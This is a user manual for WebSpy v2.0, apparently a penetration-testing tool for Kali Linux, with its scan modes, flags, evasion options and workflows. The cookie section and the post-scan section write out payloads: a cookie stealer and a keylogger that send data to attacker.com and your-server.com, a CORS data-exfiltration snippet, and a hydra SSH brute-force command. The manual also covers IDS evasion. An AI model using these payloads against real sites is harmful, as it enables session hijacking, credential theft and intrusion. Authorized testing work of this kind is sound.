# WebSpy v2.0 — User Manual
**Advanced Penetration Testing Framework**  
**Author:** Silentium Noctis  
**For:** Authorized Penetration Testing & Bug Bounty Only  

---

## Table of Contents

1. [Overview](#1-overview)
2. [Requirements & Installation](#2-requirements--installation)
3. [How to Run](#3-how-to-run)
4. [Scan Modes](#4-scan-modes)
5. [All Flags — Complete Reference](#5-all-flags--complete-reference)
6. [Timing Profiles (-T)](#6-timing-profiles--t)
7. [Evasion Mode (-e)](#7-evasion-mode--e)
8. [Security Modules](#8-security-modules)
9. [Output Options](#9-output-options)
10. [Real-World Workflows](#10-real-world-workflows)
11. [Post-Scan Actions](#11-post-scan-actions)
12. [Troubleshooting](#12-troubleshooting)

---

## 1. Overview

WebSpy is an all-in-one penetration testing automation framework built for Kali Linux. It wraps powerful Kali tools (nmap, gobuster, nikto, sublist3r, wafw00f, whatweb) and adds its own Python-based modules to give you:

- Cloudflare / WAF origin IP bypass
- Subdomain enumeration
- Port scanning (TCP + UDP)
- Directory & file busting
- S3 bucket discovery
- JavaScript secret analysis
- FTP / SSH service checks
- Sensitive file leak detection
- XSS, CSRF, Broken Access Control
- API endpoint & CORS misconfiguration
- Cookie & session security analysis

All results are filtered — only useful, actionable findings are shown. No raw dumps.

---

## 2. Requirements & Installation

### Required (Kali Linux built-in):
```
nmap          gobuster       nikto
sublist3r     wafw00f        whatweb
whois         dig            ping
```

### Python dependencies:
```bash
pip3 install requests
```

### Make executable (one-time):
```bash
chmod +x /home/noctis/Desktop/work/tools/webspy.py
```

### Verify everything works:
```bash
python3 /home/noctis/Desktop/work/tools/webspy.py -V
```
Expected output: `WebSpy v2.0 by Silentium Noctis`

---

## 3. How to Run

### Method 1 — Interactive Mode (Recommended for beginners)
Just run without any flags. Tool will ask everything step by step:
```bash
python3 /home/noctis/Desktop/work/tools/webspy.py
```

You will be asked:
- Target domain or IP
- Scan mode (Passive / Active / Bypass / Full)
- Timing level (T1 to T5)
- Evasion mode (yes/no)
- Crawl depth (1-5)
- Output file (optional)
- Which security modules to run

### Method 2 — Command Line Flags
```bash
python3 /home/noctis/Desktop/work/tools/webspy.py [flags] -t <target>
```

### Method 3 — Show Help
```bash
python3 /home/noctis/Desktop/work/tools/webspy.py -h
```

---

## 4. Scan Modes

Modes auto-enable the right combination of modules. Use `-m` flag.

| Mode | Flag | What It Does |
|------|------|--------------|
| Passive | `-m passive` | OSINT only — WHOIS, DNS, crt.sh, HackerTarget. Zero direct requests to target. |
| Active | `-m active` | Direct connection — port scan, headers, WAF, PHP, XSS, CSRF, sensitive files, API |
| Bypass | `-m bypass` | Cloudflare/WAF bypass — finds real origin IP using 5 methods |
| Full | `-m full` | Everything — all modules, all checks (recommended for full pentest) |

### Examples:

```bash
# Passive OSINT — safe, no direct contact with target
python3 webspy.py -t example.com -m passive

# Active scan — direct vuln checks
python3 webspy.py -t example.com -m active -T3

# Cloudflare bypass — find origin IP
python3 webspy.py -t example.com -m bypass

# Full pentest — all modules
python3 webspy.py -t example.com -m full -T3 -o report.txt
```

---

## 5. All Flags — Complete Reference

### Target Flag

| Flag | Description | Example |
|------|-------------|---------|
| `-t`, `--target` | Target domain or IP address (required) | `-t example.com` or `-t 192.168.1.1` |

```bash
python3 webspy.py -t example.com -m passive
python3 webspy.py -t 192.168.1.1 --tcp --ping
```

---

### Module Flags

#### `--ping` — Host Up/Down Check
**What it does:** Checks if target is alive using ICMP ping and TCP connection on ports 80, 443, 22, 8080.

**Use case:** Before running any scan, confirm the target is reachable.

```bash
python3 webspy.py -t example.com --ping
python3 webspy.py -t 192.168.1.1 --ping
```

---

#### `--whois` — WHOIS + ASN Lookup
**What it does:** Looks up domain registration info — registrar, dates, name servers, ASN, country, organization.

**Use case:** Passive recon — find who owns the domain, when it expires, hosting provider.

```bash
python3 webspy.py -t example.com --whois
python3 webspy.py -t example.com --whois -m passive
```

---

#### `--waf` — WAF Fingerprinting
**What it does:** Runs `wafw00f` to detect if a Web Application Firewall (Cloudflare, Akamai, ModSecurity, etc.) is protecting the target.

**Use case:** Know before attacking — if WAF present, enable evasion mode.

```bash
python3 webspy.py -t example.com --waf
python3 webspy.py -t example.com --waf -e      # with evasion
```

---

#### `--tech` — Web Technology Detection
**What it does:** Runs `whatweb` to fingerprint the web stack — CMS, framework, server, language, plugins.

**Use case:** Know if target runs WordPress, Laravel, Apache, Nginx, PHP version — then search CVEs for that version.

```bash
python3 webspy.py -t example.com --tech
python3 webspy.py -t example.com --tech --waf
```

---

#### `--cf` — Cloudflare Bypass / Origin IP Discovery
**What it does:** Uses 5 methods to find the real server IP behind Cloudflare or any WAF:
1. Historical DNS (HackerTarget API)
2. Subdomain bypass scan (40+ common subdomains)
3. MX / SPF record origin lookup
4. SSL certificate SAN analysis
5. Bypass header injection test

Then verifies each found IP — checks which ports are open, whether cPanel/WHM panels are exposed, and if the site is accessible via direct IP or needs a Host header.

**Use case:** Target hides behind Cloudflare — find the real IP to scan directly.

```bash
python3 webspy.py -t example.com --cf
python3 webspy.py -t example.com --cf -e -T2   # stealth bypass
python3 webspy.py -t example.com --cf --waf    # detect WAF then bypass
```

---

#### `--sub` — Subdomain Enumeration
**What it does:** Finds subdomains using `sublist3r` (passive, multi-source) and `gobuster dns` (active bruteforce with wordlist).

**Use case:** Expand attack surface — subdomains often have less security than the main domain.

```bash
python3 webspy.py -t example.com --sub
python3 webspy.py -t example.com --sub -T4 -D 3    # aggressive, deeper
python3 webspy.py -t example.com --sub --cf        # enum then check origins
```

---

#### `--tcp` — TCP Port Scan
**What it does:** Runs `nmap -sV -sC --open` to find open TCP ports, detect service versions, and run default scripts.

**Use case:** Find what services are running — SSH, FTP, databases, admin panels, web servers.

```bash
python3 webspy.py -t example.com --tcp
python3 webspy.py -t example.com --tcp -p 1-65535 -T4    # all ports, fast
python3 webspy.py -t example.com --tcp -p 80,443,8080    # specific ports
sudo python3 webspy.py -t example.com --tcp -e -T1       # evasion + stealth
```

---

#### `--udp` — UDP Port Scan
**What it does:** Runs `nmap -sU` to scan UDP ports (DNS 53, SNMP 161, TFTP 69, NTP 123, etc.).

**Use case:** Services on UDP are often forgotten and poorly secured.

> **Note:** Requires `sudo` (root) because raw socket access is needed.

```bash
sudo python3 webspy.py -t example.com --udp
sudo python3 webspy.py -t example.com --udp -p 53,161,69,123 -T3
```

---

#### `--dir` — Directory & File Busting
**What it does:** Runs `gobuster dir` with wordlists to find hidden directories and files. Also manually checks 20+ high-value paths (`.env`, `.git`, `phpMyAdmin`, `backup.zip`, `/admin`, etc.).

**Use case:** Find hidden admin panels, backup files, configuration files, source code leaks.

```bash
python3 webspy.py -t example.com --dir
python3 webspy.py -t example.com --dir -D 4 -T4         # deep + aggressive
python3 webspy.py -t example.com --dir --proxy 127.0.0.1:8080  # through Burp
```

---

#### `--s3` — S3 Bucket Discovery
**What it does:** Tests 30+ naming patterns based on the domain name to find open or existing AWS S3 buckets. Reports PUBLIC (critical) or EXISTS-403 (medium).

**Use case:** Companies often leave S3 buckets publicly readable with sensitive files.

```bash
python3 webspy.py -t example.com --s3
python3 webspy.py -t example.com --s3 -T4    # fast check
```

If a public bucket is found, it suggests:
```bash
aws s3 ls s3://<bucket-name> --no-sign-request
aws s3 sync s3://<bucket-name> ./loot --no-sign-request
```

---

#### `--headers` — Security Headers Audit
**What it does:** Checks for missing or misconfigured HTTP security headers:
- `Strict-Transport-Security` (HSTS)
- `Content-Security-Policy` (CSP)
- `X-Frame-Options` (Clickjacking)
- `X-Content-Type-Options`
- `X-XSS-Protection`
- `Referrer-Policy`
- `Permissions-Policy`
- `Cross-Origin-Opener-Policy`

**Use case:** Missing headers = easy bug bounty findings. HSTS missing = SSL stripping possible.

```bash
python3 webspy.py -t example.com --headers
python3 webspy.py -t example.com --headers -e    # with evasion
```

---

#### `--js` — JavaScript File Analysis
**What it does:** Downloads all `.js` files from the target and scans them for:
- API endpoints (`/api/v1/`, `/admin/`, `/auth/`)
- Secrets (AWS keys, API keys, tokens, JWTs, passwords)
- Email addresses
- Bearer tokens, GitHub tokens, Google API keys

**Use case:** Developers accidentally leave credentials and internal API endpoints in client-side JS.

```bash
python3 webspy.py -t example.com --js
python3 webspy.py -t example.com --js -D 3 -v    # verbose, deeper
```

---

#### `--php` — PHP Surface Scan
**What it does:** Detects PHP version from headers, then checks for exposed PHP paths (`phpinfo.php`, `wp-login.php`, `xmlrpc.php`, `composer.json`, error logs, etc.).

**Use case:** PHP version exposure → search for CVEs. Exposed `phpinfo` → full server info disclosure.

```bash
python3 webspy.py -t example.com --php
python3 webspy.py -t example.com --php --headers    # combined check
```

---

#### `--nikto` — Nikto Web Server Scan
**What it does:** Runs `nikto` to check for web server misconfigurations, outdated software, CVEs, dangerous HTTP methods, and default files.

**Use case:** Quick automated vuln scanner for web server layer.

```bash
python3 webspy.py -t example.com --nikto
python3 webspy.py -t example.com --nikto --proxy 127.0.0.1:8080
```

---

## 8. Security Modules

These modules specifically check for vulnerabilities in the web application layer.

---

#### `--ftp` — FTP Anonymous & Default Login Check
**What it does:**
- Checks if FTP port 21 or 2121 is open
- Grabs the FTP banner (server version)
- Tests 15 default credential pairs: `anonymous`, `ftp:ftp`, `admin:admin`, `root:root`, `guest:guest`, etc.
- If login succeeds: lists directory contents

**Use case:** Many servers still have FTP open with default or anonymous login — instant file access.

```bash
python3 webspy.py -t example.com --ftp
python3 webspy.py -t 192.168.1.1 --ftp -v        # verbose output
python3 webspy.py -t 192.168.1.1 --ftp --ssh     # FTP + SSH together
```

**What a successful finding looks like:**
```
[CRITICAL] FTP LOGIN OK  →  anonymous:anonymous@
[+] FTP Directory listing (12 items):
    backup_2024.zip
    config.php
    users.csv
```

---

#### `--ssh` — SSH Banner Grab + Auth Method Audit
**What it does:**
- Checks SSH on ports 22, 2222, 222, 2022
- Grabs SSH banner (OpenSSH version)
- Runs `nmap --script ssh-auth-methods` to find which auth methods are allowed (password, publickey, none)
- Suggests `searchsploit` command if version is found
- Flags if SSH allows "none" auth (no password needed)

**Use case:** Old OpenSSH versions have known CVEs. Password auth enabled = brute-force possible.

```bash
python3 webspy.py -t example.com --ssh
python3 webspy.py -t 192.168.1.1 --ssh -v
python3 webspy.py -t 192.168.1.1 --ftp --ssh --tcp    # full service check
```

**What a finding looks like:**
```
[+] SSH port 22 OPEN
[+] SSH Banner : SSH-2.0-OpenSSH_7.4
[+] SSH Version: OpenSSH_7.4
    searchsploit: searchsploit openssh 7.4
[+] SSH | password (supported auth method)
```

---

#### `--sensitive` — Sensitive File & Information Leak
**What it does:** Checks 40+ paths for exposed sensitive files:
- `.env`, `.env.production`, `.env.local` (database passwords, API keys)
- `.git/HEAD`, `.git/config` (source code leak)
- `backup.zip`, `db.sql`, `database.sql`, `dump.sql` (database dumps)
- `phpinfo.php`, `server-status` (server info)
- `wp-config.php`, `wp-config.php.bak` (WordPress credentials)
- `error.log`, `laravel.log`, `debug.log` (sensitive debug info)
- `composer.json`, `composer.lock` (dependency info)
- `swagger.json`, `openapi.yaml` (API schema)
- `.ssh/id_rsa`, `.aws/credentials` (private keys)

Also scans file content for: passwords, API keys, AWS keys, DB connection strings, private keys, JWT tokens.

**Use case:** Highest-impact findings — `.env` files often contain DB passwords, API keys, secret keys.

```bash
python3 webspy.py -t example.com --sensitive
python3 webspy.py -t example.com --sensitive -e -T2    # stealth mode
python3 webspy.py -t example.com --sensitive -v        # show all responses
```

**Critical finding example:**
```
[CRITICAL] [200] https://example.com/.env (2048b)
[CRITICAL]   SECRET FOUND → Password: DB_PASSWORD=SuperSecret123
[CRITICAL]   SECRET FOUND → API Key: STRIPE_SECRET_KEY=sk_live_abc123
[CRITICAL] GIT REPO EXPOSED at https://example.com/.git/
    Dump with: git-dumper https://example.com/.git/ ./dumped_repo
```

---

#### `--cookie` — Cookie & Session Security Analysis
**What it does:** Analyzes all cookies set by the target for security issues:
- **Secure flag** missing → cookie sent over HTTP (sniffable)
- **HttpOnly flag** missing → cookie readable by JavaScript (XSS stealable)
- **SameSite** missing or `None` → CSRF risk
- **Weak entropy** → short/predictable session ID
- **JWT token** in cookie → can be decoded at jwt.io
- **MD5-like session ID** → weak, predictable

Shows a formatted table. Provides XSS cookie-steal PoC if HttpOnly is missing.

**Use case:** Cookie issues are valid bug bounty findings. Missing HttpOnly + XSS = account takeover.

```bash
python3 webspy.py -t example.com --cookie
python3 webspy.py -t example.com --cookie --xss    # cookie analysis + XSS
```

**Finding example:**
```
COOKIE NAME         VALUE (first 30)    Secure  HttpOnly  SameSite    ISSUE
────────────────────────────────────────────────────────────────────────────
PHPSESSID           abc123def456        NO      NO        MISSING     NO Secure flag | NO HttpOnly | SameSite weak

[CRITICAL] Cookie 'PHPSESSID': NO Secure flag | NO HttpOnly | SameSite weak
    XSS steal PoC: <script>document.location='http://attacker.com/?c='+document.cookie</script>
```

---

#### `--xss` — XSS Detection
**What it does:**
- Extracts all form inputs and GET parameters from the page
- Tests reflected XSS with 4 payloads on each parameter:
  - `<script>alert(1)</script>`
  - `"><script>alert(1)</script>`
  - `<img src=x onerror=alert(1)>`
  - `<svg onload=alert(1)>`
- Checks for DOM XSS sinks: `document.write`, `innerHTML`, `eval()`, `location.hash`, etc.
- Tests for SSTI (Server Side Template Injection): `{{7*7}}`, `${7*7}`

**Use case:** XSS is a top bug bounty finding — leads to session theft, phishing, account takeover.

```bash
python3 webspy.py -t example.com --xss
python3 webspy.py -t example.com --xss -e          # with evasion headers
python3 webspy.py -t example.com --xss --cookie    # XSS + cookie check
python3 webspy.py -t example.com --xss --proxy 127.0.0.1:8080   # through Burp
```

**Critical finding example:**
```
[CRITICAL] REFLECTED XSS found!
[CRITICAL]   Parameter : search
[CRITICAL]   Payload   : <script>alert(1)</script>
[CRITICAL]   URL       : https://example.com/?search=<script>alert(1)</script>
```

---

#### `--csrf` — CSRF + Broken Access Control + IDOR
**What it does three things:**

**1. CSRF Check:**
- Finds all HTML forms on the page
- Checks if POST forms have CSRF tokens (csrf, _token, authenticity_token, nonce)
- Flags POST forms without CSRF protection

**2. Broken Access Control:**
- Tests 18 admin/restricted paths without authentication:
  `/admin`, `/dashboard`, `/wp-admin`, `/api/admin`, `/api/users`, `/internal`, etc.
- If a path returns 403, tries 6 header-based bypass techniques:
  `X-Original-URL`, `X-Rewrite-URL`, `X-Custom-IP-Authorization: 127.0.0.1`, etc.

**3. IDOR Detection:**
- Finds ID parameters in page (`?id=`, `?user_id=`, `?uid=`, `?account=`)
- Tests with different values (1, 2, previous ID, 0, "admin") to detect insecure direct object references

**Use case:** BAC / IDOR are critical findings. CSRF on state-changing actions = account actions without consent.

```bash
python3 webspy.py -t example.com --csrf
python3 webspy.py -t example.com --csrf -e         # with evasion
python3 webspy.py -t example.com --csrf --xss      # CSRF + XSS together
```

**Finding examples:**
```
[CRITICAL] CSRF TOKEN MISSING on POST form → action: /user/update
    PoC: Create a page with a hidden form posting to /user/update

[CRITICAL] ADMIN PATH ACCESSIBLE (no auth): [200] /admin/dashboard
[CRITICAL] 403 BYPASS via header X-Original-URL on /admin

[!] Potential IDOR: user_id=1 → 200 (4521b)
    URL: https://example.com?user_id=1
```

---

#### `--api` — API Endpoint Discovery + CORS + GraphQL
**What it does:**

**1. API Endpoint Scan:**
- Checks 24 common API paths:
  `/api`, `/api/v1`, `/api/v2`, `/api/v3`, `/graphql`, `/swagger`, `/v1`, `/rest`, `/ws`, `/api/auth`, etc.
- Detects JSON responses and lists keys
- Flags sensitive keys in responses (password, token, secret, api_key)

**2. GraphQL Introspection:**
- If `/graphql` is found, sends introspection query `{__schema{types{name}}}`
- Full schema exposed = all types, queries, mutations visible to attacker

**3. CORS Misconfiguration:**
- Tests if the API reflects arbitrary origins in `Access-Control-Allow-Origin`
- Tests: `https://evil.com`, `null`, `https://target.evil.com`
- Critical if ACAO reflects origin AND `Access-Control-Allow-Credentials: true` → credential theft

**Use case:** APIs are major attack surface — often lack authentication, CORS misconfigured = data theft from any website.

```bash
python3 webspy.py -t example.com --api
python3 webspy.py -t example.com --api --js       # API discovery + JS analysis
python3 webspy.py -t example.com --api -v         # verbose — see all responses
python3 webspy.py -t example.com --api --proxy 127.0.0.1:8080   # intercept in Burp
```

**Critical finding example:**
```
[FOUND] API [200] /api/v1/users (8432b) JSON:True
    JSON Keys: ['id', 'username', 'email', 'password_hash', 'token']
[CRITICAL]   SENSITIVE KEY in API response: ['token', 'password_hash']

[CRITICAL] GraphQL INTROSPECTION ENABLED — full schema exposed!

[CRITICAL] CORS CRITICAL: Origin=https://evil.com reflected + Allow-Credentials=true
    This allows full cross-origin credential theft!
```

---

## 6. Timing Profiles (-T)

Control scan speed vs. stealth. Works like nmap -T.

| Level | Name | Delay | Threads | Use Case |
|-------|------|-------|---------|----------|
| `-T1` | Stealth | 3 seconds | 2 | IDS/IPS evasion, very slow |
| `-T2` | Polite | 1 second | 5 | Low noise, careful |
| `-T3` | Normal | 0.3 seconds | 15 | Default, balanced |
| `-T4` | Aggressive | 0.05 seconds | 30 | Fast, more noise |
| `-T5` | Insane | No delay | 60 | Maximum speed |

```bash
# Maximum stealth (IDS evasion)
python3 webspy.py -t example.com -m full -T1 -e

# Default balanced
python3 webspy.py -t example.com -m full -T3

# Fast bug bounty recon
python3 webspy.py -t example.com --sub --cf --s3 -T4

# Speed run (noisy)
python3 webspy.py -t example.com -m full -T5
```

---

## 7. Evasion Mode (-e)

`-e` or `--evasion` enables multiple bypass techniques simultaneously:

| Technique | What It Does |
|-----------|-------------|
| User-Agent rotation | Cycles through 7 different UAs (Chrome, Firefox, Mobile, Googlebot) |
| Timing jitter | Randomizes delays ±50% to avoid pattern detection |
| Spoofed IP headers | Adds random `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP` |
| nmap fragmentation | `-f` flag splits packets to bypass signature detection |
| nmap decoys | `-D RND:5` adds 5 fake source IPs to confuse IDS |

```bash
# Evasion with stealth timing (maximum stealth)
python3 webspy.py -t example.com -m full -T1 -e

# Evasion for web module only
python3 webspy.py -t example.com --xss --sensitive -e -T2

# Evasion through proxy (intercept + evade)
python3 webspy.py -t example.com -m active -e --proxy 127.0.0.1:8080
```

---

## 9. Output Options

| Flag | Description | Example |
|------|-------------|---------|
| `-o <file>` | Save findings as text file | `-o report.txt` |
| `-j <file>` | Save full JSON report | `-j report.json` |
| `-v` | Verbose — show raw tool output | `-v` |
| `-q` | Quiet — show only findings | `-q` |

```bash
# Text report
python3 webspy.py -t example.com -m full -o pentest_report.txt

# JSON report (for automation / parsing)
python3 webspy.py -t example.com -m full -j report.json

# Both formats
python3 webspy.py -t example.com -m full -o report.txt -j report.json

# Verbose — see every tool command output
python3 webspy.py -t example.com --tcp -v

# Quiet — only print findings (clean output)
python3 webspy.py -t example.com -m full -q -o findings.txt
```

---

## 10. Real-World Workflows

### Workflow 1 — Bug Bounty Quick Recon
```bash
python3 webspy.py -t target.com --sub --cf --s3 --js --headers -T4 -o bb_report.txt
```

### Workflow 2 — Full Black-Box Pentest
```bash
python3 webspy.py -t target.com -m full -T3 -e -o full_report.txt -j full_report.json
```

### Workflow 3 — Cloudflare Bypass First
```bash
# Step 1: Find origin IP
python3 webspy.py -t target.com --cf -T3

# Step 2: Once origin IP found (e.g. 1.2.3.4), scan it directly
python3 webspy.py -t 1.2.3.4 --tcp --ftp --ssh -T4
```

### Workflow 4 — Web Application Vuln Audit
```bash
python3 webspy.py -t target.com --sensitive --cookie --xss --csrf --api --headers -T3 -e -o vuln_report.txt
```

### Workflow 5 — Stealth Internal Pentest (IDS Evasion)
```bash
python3 webspy.py -t target.com -m full -T1 -e --proxy 127.0.0.1:8080 -o stealth_report.txt
```

### Workflow 6 — WordPress Site Audit
```bash
python3 webspy.py -t target.com --php --sensitive --xss --csrf --headers --tech -T3
```

### Workflow 7 — API Security Assessment
```bash
python3 webspy.py -t target.com --api --js --sensitive --cookie -T3 --proxy 127.0.0.1:8080 -v
```

### Workflow 8 — Network Service Check (Internal IP)
```bash
sudo python3 webspy.py -t 192.168.1.1 --ping --tcp --udp --ftp --ssh -T3
```

### Workflow 9 — Through Tor (Anonymous)
```bash
# Start Tor first
sudo service tor start

# Run through Tor
python3 webspy.py -t target.com --cf --headers --sensitive --tor
```

### Workflow 10 — Through Burp Suite Proxy (Manual Intercept)
```bash
# Burp must be running on 127.0.0.1:8080
python3 webspy.py -t target.com --xss --csrf --api --proxy 127.0.0.1:8080
```

---

## 11. Post-Scan Actions

### Origin IP found — bypass Cloudflare WAF directly:
```bash
curl -sk -H 'Host: target.com' https://<origin_ip>/ | head -80
nmap -sV -sC --open -p- <origin_ip> -T4
```

### Public S3 bucket found:
```bash
aws s3 ls s3://<bucket-name> --no-sign-request
aws s3 sync s3://<bucket-name> ./loot --no-sign-request
```

### Git repo exposed — dump it:
```bash
git-dumper https://target.com/.git/ ./dumped_repo
cd dumped_repo && git log --oneline
```

### SSH password auth enabled — brute force:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com -T 4
```

### FTP login success — explore files:
```bash
ftp target.com
# login with found credentials
```

### XSS found — craft full PoC:
```bash
# Cookie stealer
<script>document.location='http://your-server.com/?c='+document.cookie</script>

# Keylogger
<script>document.onkeypress=function(e){fetch('http://your-server.com/?k='+e.key)}</script>
```

### CORS misconfiguration — steal data PoC:
```javascript
// Run this from evil.com to steal API data
fetch('https://target.com/api/user', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('http://attacker.com/?data=' + JSON.stringify(d)))
```

### GraphQL introspection — dump full schema:
```bash
# Use graphql-voyager or:
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
```

---

## 12. Troubleshooting

| Problem | Solution |
|---------|----------|
| `nmap not found` | `sudo apt install nmap` |
| `gobuster not found` | `sudo apt install gobuster` |
| `nikto not found` | `sudo apt install nikto` |
| `sublist3r not found` | `sudo apt install sublist3r` or `pip3 install sublist3r` |
| `wafw00f not found` | `pip3 install wafw00f` |
| `whatweb not found` | `sudo apt install whatweb` |
| UDP scan fails | Run with `sudo` — raw socket needs root |
| SSL errors | Already disabled with `verify=False` |
| Timeout on slow targets | Use `-T2` or `-T1` with higher timeout |
| No wordlist for gobuster | `sudo apt install seclists` or `sudo apt install dirb` |
| Tool hangs on nikto | Normal — nikto is slow. Use `--nikto` only when needed |
| Proxy not working | Make sure Burp/proxy is running before scan |

### Check all tools at once:
```bash
for tool in nmap gobuster nikto sublist3r wafw00f whatweb whois dig; do
    which $tool &>/dev/null && echo "OK: $tool" || echo "MISSING: $tool"
done
```

---

## Quick Command Reference Card

```
python3 webspy.py                              # Interactive mode
python3 webspy.py -h                           # Help
python3 webspy.py -V                           # Version

python3 webspy.py -t TARGET -m passive         # Passive OSINT
python3 webspy.py -t TARGET -m active          # Active scan
python3 webspy.py -t TARGET -m bypass          # CF/WAF bypass
python3 webspy.py -t TARGET -m full -T3        # Full pentest

python3 webspy.py -t TARGET --ping             # Host check
python3 webspy.py -t TARGET --whois            # WHOIS + ASN
python3 webspy.py -t TARGET --waf              # WAF detect
python3 webspy.py -t TARGET --tech             # Tech fingerprint
python3 webspy.py -t TARGET --cf               # Origin IP bypass
python3 webspy.py -t TARGET --sub              # Subdomains
python3 webspy.py -t TARGET --tcp              # TCP port scan
sudo python3 webspy.py -t TARGET --udp         # UDP port scan
python3 webspy.py -t TARGET --dir              # Dir busting
python3 webspy.py -t TARGET --s3               # S3 buckets
python3 webspy.py -t TARGET --headers          # Security headers
python3 webspy.py -t TARGET --js               # JS secrets
python3 webspy.py -t TARGET --php              # PHP surface
python3 webspy.py -t TARGET --nikto            # Nikto scan

python3 webspy.py -t TARGET --ftp              # FTP login check
python3 webspy.py -t TARGET --ssh              # SSH audit
python3 webspy.py -t TARGET --sensitive        # Sensitive files
python3 webspy.py -t TARGET --cookie           # Cookie analysis
python3 webspy.py -t TARGET --xss              # XSS detection
python3 webspy.py -t TARGET --csrf             # CSRF + BAC + IDOR
python3 webspy.py -t TARGET --api              # API + CORS + GraphQL

-T1 / -T2 / -T3 / -T4 / -T5                     # Timing (stealth→insane)
-e                                               # Evasion mode ON
-D 3                                             # Crawl depth 3
-p 80,443,8080                                   # Custom ports
--proxy 127.0.0.1:8080                           # Burp proxy
--tor                                            # Through Tor
-o report.txt                                    # Save text report
-j report.json                                   # Save JSON report
-v                                               # Verbose
-q                                               # Quiet (findings only)
```

---

**WebSpy v2.0 — Created by Silentium Noctis**  
*For authorized penetration testing and bug bounty only.*
